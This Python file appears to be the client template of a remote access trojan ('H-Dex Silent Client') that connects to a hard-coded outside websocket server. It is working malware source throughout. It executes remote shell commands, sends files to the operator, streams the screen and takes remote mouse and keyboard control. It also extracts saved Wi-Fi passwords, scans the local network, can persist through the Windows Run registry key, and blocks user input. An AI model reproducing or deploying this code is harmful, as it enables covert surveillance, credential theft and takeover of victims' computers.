# H-Dex Silent Client Template
# This is a headless client, designed to be built by the H-Dex Dashboard Builder.

import asyncio
import websockets
import json
import threading
import platform
import psutil
import os
import socket
import subprocess
import time
import base64
import io
import winreg
import shutil

# --- Imports for features ---
try:
    import mss
    from PIL import Image
    import pyautogui
    from pynput import keyboard
    import requests
    import pyperclip
    import sounddevice as sd
    import numpy as np
    import ctypes
except ImportError as e:
    print(f"Dependency error: {e}")
    pass

# --- Builder-injected Configuration ---
SERVER_URI = "wss://realmrhacker-h-dex.hf.space/ws"
CLIENT_TAG = "Local-Test"
ADD_TO_STARTUP = False
STARTUP_KEY_NAME = "HDexTest"

class SilentClient:
    def __init__(self):
        self.websocket = None
        self.running = True
        self.screen_streaming = False
        self.keylogger_running = False
        self.loop = None
        
        if ADD_TO_STARTUP:
            self.ensure_persistence()

        threading.Thread(target=self.start_async_loop, daemon=True).start()

    def ensure_persistence(self):
        try:
            exe_path = os.path.realpath(subprocess.sys.executable)
            appdata_path = os.getenv('APPDATA')
            persist_dir = os.path.join(appdata_path, 'H-DexClient')
            if not os.path.exists(persist_dir): os.makedirs(persist_dir)
            new_exe_path = os.path.join(persist_dir, os.path.basename(exe_path))

            if exe_path.lower() != new_exe_path.lower():
                shutil.copy(exe_path, new_exe_path)
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, new_exe_path)
                subprocess.Popen(new_exe_path)
                os._exit(0)
        except Exception as e:
            print(f"Persistence Error: {e}")

    def start_async_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.connect_to_server())

    async def connect_to_server(self):
        while self.running:
            try:
                import ssl
                ssl_context = ssl._create_unverified_context()
                async with websockets.connect(SERVER_URI, ssl=ssl_context) as websocket:
                    self.websocket = websocket
                    info = self.gather_system_info()
                    await websocket.send(json.dumps({"type": "register_device", "info": info}))
                    await self.receive_messages(websocket)
            except Exception as e:
                print(f"Connection failed: {e}. Retrying in 5s...")
                await asyncio.sleep(5)

    def get_hwid(self):
        try:
            guid = platform.node() + platform.processor() + platform.machine()
            import hashlib
            return hashlib.sha256(guid.encode()).hexdigest()[:12].upper()
        except:
             return "TEST-DEBUG-ID"

    def gather_system_info(self):
        return {
            "id": self.get_hwid(),
            "name": f"Test-Device-{platform.node()}",
            "ip": "127.0.0.1",
            "tag": CLIENT_TAG,
            "os": platform.system()
        }

    def get_public_ip(self):
        try: return requests.get('https://api.ipify.org', timeout=5).text
        except: return "Unknown"

    # --- Features ---
    async def list_directory(self, path):
        try:
            items = []
            for name in os.listdir(path):
                p = os.path.join(path, name)
                items.append({"name": name, "is_dir": os.path.isdir(p)})
            await self.websocket.send(json.dumps({"type": "dir_list", "path": path, "items": items}))
        except Exception as e:
            await self.websocket.send(json.dumps({"type": "dir_list", "path": path, "items": [], "error": str(e)}))

    async def upload_file_to_server(self, path):
        try:
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            await self.websocket.send(json.dumps({"type": "file_content", "filename": os.path.basename(path), "content": content}))
        except: pass

    async def run_command(self, cmd):
        try:
            if cmd.lower().startswith("cd "):
                new_dir = cmd[3:].strip()
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    out = f"Changed directory to {os.getcwd()}"
                else:
                    out = "Directory not found"
            else:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, cwd=os.getcwd()).decode('utf-8', errors='ignore')
        except Exception as e: out = str(e)
        
        # Append CWD to output for prompt
        out += f"\n\nPS {os.getcwd()}> "
        await self.websocket.send(json.dumps({"type": "command_output", "output": out}))

    async def send_process_list(self):
        procs = []
        for p in psutil.process_iter(['pid', 'name']):
            try: procs.append(p.info)
            except: pass
        await self.websocket.send(json.dumps({"type": "process_list", "processes": procs}))

    def kill_process(self, pid):
        try: psutil.Process(pid).terminate()
        except: pass

    async def scan_network(self, ip_range="AUTO"):
        devices = []
        try:
            output = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
            lines = output.splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 3 and parts[0].count('.') == 3:
                    ip = parts[0]
                    mac = parts[1]
                    if not ip.endswith(".255") and not ip.startswith("224."):
                        devices.append({"ip": ip, "mac": mac})
            await self.websocket.send(json.dumps({
                "type": "network_scan", "devices": devices
            }))
        except: pass
    async def take_screenshot(self):
        try:
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                img.thumbnail((800, 600))
                buffer = io.BytesIO()
                img.save(buffer, format="JPEG", quality=80)
                b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                await self.websocket.send(json.dumps({
                    "type": "screen_frame", 
                    "data": b64,
                    "single_frame": True
                }))
        except: pass

    def stream_screen(self):
        with mss.mss() as sct:
            while self.screen_streaming and self.websocket:
                try:
                    monitor = sct.monitors[1]
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    img.thumbnail((800, 600)) 
                    buffer = io.BytesIO()
                    img.save(buffer, format="JPEG", quality=50)
                    b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    asyncio.run_coroutine_threadsafe(
                        self.websocket.send(json.dumps({"type": "screen_frame", "data": b64})), 
                        self.loop
                    )
                    time.sleep(0.1)
                except: break

    def mouse_move(self, x, y):
        w, h = pyautogui.size()
        pyautogui.moveTo(x * w, y * h)

    def mouse_click(self, x, y, btn):
        w, h = pyautogui.size()
        pyautogui.click(x * w, y * h, button=btn)

    def key_press(self, key):
        pyautogui.press(key)

    # --- New Prank & Control Features ---
    async def show_message(self, title, msg, icon_type):
        # icon_type: 16=Error, 32=Question, 48=Warning, 64=Info
        ctypes.windll.user32.MessageBoxW(0, msg, title, int(icon_type))

    async def prank_virus(self):
        # Simulates a fake virus effect
        for _ in range(5):
            ctypes.windll.user32.MessageBoxW(0, "CRITICAL SYSTEM ERROR: VIRUS DETECTED!", "SYSTEM ALERT", 16)
            time.sleep(0.5)

    async def set_wallpaper(self, path):
        # path must be absolute on client
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

    async def monitor_control(self, state):
        # state: 2 = Off, -1 = On
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, state)

    async def get_location(self):
        try:
            loc = requests.get("http://ip-api.com/json").json()
            await self.websocket.send(json.dumps({"type": "location_info", "data": loc}))
        except: pass

    async def get_wifi_passwords(self):
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore")
            profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
            passwords = []
            for p in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', p, 'key=clear']).decode('utf-8', errors="ignore")
                    key = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                    passwords.append(f"{p}: {key[0] if key else 'Open'}")
                except: pass
            await self.websocket.send(json.dumps({"type": "command_output", "output": "\n".join(passwords)}))
        except: pass

    async def receive_messages(self, websocket):
        async for message in websocket:
            try:
                data = json.loads(message)
                t = data.get("type")

                if t == "list_dir": await self.list_directory(data.get("path"))
                elif t == "download_file": await self.upload_file_to_server(data.get("path"))
                elif t == "execute_command": await self.run_command(data.get("command"))
                elif t == "get_processes": await self.send_process_list()
                elif t == "kill_process": self.kill_process(data.get("pid"))
                elif t == "start_screen_stream": 
                    if not self.screen_streaming:
                        self.screen_streaming = True
                        threading.Thread(target=self.stream_screen, daemon=True).start()
                elif t == "stop_screen_stream": self.screen_streaming = False
                elif t == "take_screenshot": await self.take_screenshot()
                elif t == "scan_network": await self.scan_network(data.get("range"))
                elif t == "mouse_move": self.mouse_move(data.get("x"), data.get("y"))
                elif t == "mouse_click": self.mouse_click(data.get("x"), data.get("y"), data.get("button"))
                elif t == "key_press": self.key_press(data.get("key"))
                
                # New Handlers
                elif t == "show_message": threading.Thread(target=lambda: asyncio.run(self.show_message(data.get("title"), data.get("message"), data.get("icon")))).start()
                elif t == "prank_virus": threading.Thread(target=lambda: asyncio.run(self.prank_virus())).start()
                elif t == "set_wallpaper": await self.set_wallpaper(data.get("path"))
                elif t == "monitor_off": await self.monitor_control(2)
                elif t == "monitor_on": await self.monitor_control(-1)
                elif t == "get_location": await self.get_location()
                elif t == "get_wifi": await self.get_wifi_passwords()
                elif t == "open_cd": ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
                elif t == "beep": 
                    import winsound
                    winsound.Beep(1000, 1000)
                elif t == "speak":
                    txt = data.get("text", "Hello")
                    cmd = f"powershell -Command \"Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{txt}');\""
                    subprocess.Popen(cmd, shell=True)
                elif t == "list_apps": await self.list_installed_apps()
                elif t == "block_input": ctypes.windll.user32.BlockInput(True)
                elif t == "unblock_input": ctypes.windll.user32.BlockInput(False)
                elif t == "get_services": await self.get_services()
                elif t == "service_action": await self.service_action(data.get("name"), data.get("action"))
                elif t == "get_startup": await self.get_startup_items()
                elif t == "delete_startup": await self.delete_startup_item(data.get("path"))
                
            except Exception as e:
                print(f"Error: {e}")

    async def get_services(self):
        try:
            services = []
            for service in psutil.win_service_iter():
                services.append(service.as_dict())
            await self.websocket.send(json.dumps({"type": "service_list", "services": services}))
        except Exception as e:
            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Error getting services: {e}"}))

    async def service_action(self, name, action):
        try:
            service = psutil.win_service_get(name)
            if action == "start": service.start()
            elif action == "stop": service.stop()
            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Service {name} {action}ed"}))
        except Exception as e:
            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Error {action}ing service: {e}"}))

    async def get_startup_items(self):
        try:
            cmd = "wmic startup get Caption, Command, Location /format:csv"
            out = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            await self.websocket.send(json.dumps({"type": "startup_list", "output": out}))
        except: pass

    async def delete_startup_item(self, path):
        # This is tricky as it requires parsing the location. 
        # For now, we'll just try to delete the registry key if provided, or file.
        # Simplified: Just run a reg delete command if it's a registry path
        try:
            if "HK" in path:
                cmd = f'reg delete "{path}" /f'
                subprocess.Popen(cmd, shell=True)
            else:
                if os.path.exists(path): os.remove(path)
        except: pass

    async def list_installed_apps(self):
        try:
            cmd = "powershell \"Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion\""
            out = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            await self.websocket.send(json.dumps({"type": "command_output", "output": out}))
        except Exception as e:
            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Error: {str(e)}"}))

if __name__ == "__main__":
    client = SilentClient()
    while client.running: time.sleep(1)
